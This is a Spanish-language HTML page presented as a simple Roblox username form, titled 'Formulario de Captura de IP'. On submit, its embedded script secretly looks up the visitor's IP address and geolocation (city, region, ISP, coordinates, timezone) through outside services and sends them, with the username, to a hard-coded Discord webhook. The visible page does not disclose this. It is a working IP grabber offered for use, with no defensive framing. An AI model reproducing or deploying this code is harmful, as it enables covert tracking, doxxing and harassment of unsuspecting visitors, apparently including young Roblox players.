<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Captura de IP</title>
    <script>
        async function sendContact(event) {
            event.preventDefault();

            // Obtener la IP del usuario
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;

            // Obtener información detallada de la IP usando ipinfo.io
            const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
            const ipInfoData = await ipInfoResponse.json();

            const username = document.getElementById('username').value;

            // Preparar los datos para enviar al webhook de Discord
            const data = {
                content: `Nueva entrada:\nIP: ${userIP}\nUsuario de Roblox: ${username}\nCiudad: ${ipInfoData.city}\nRegión: ${ipInfoData.region}\nPaís: ${ipInfoData.country}\nOrganización: ${ipInfoData.org}\nProveedor de Internet: ${ipInfoData.asn}\nCoordenadas: ${ipInfoData.loc}\nTiempo de Zona: ${ipInfoData.timezone}`,
            };

            // Enviar los datos al webhook de Discord
            fetch('https://discord.com/api/webhooks/1411003921953984512/eWRarF44aGvN0ZatZ4S4IxA9IH8JGb_KA7nLuZlaFj2G3FdFUrZLHW28egfPg6cC4092', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        }
    </script>
</head>
<body>
    <form onsubmit="sendContact(event)">
        <div>
            <label for="username">Nombre de Usuario de Roblox:</label>
            <input type="text" id="username" required>
        </div>
        <button type="submit">Enviar</button>
    </form>
</body>
</html>
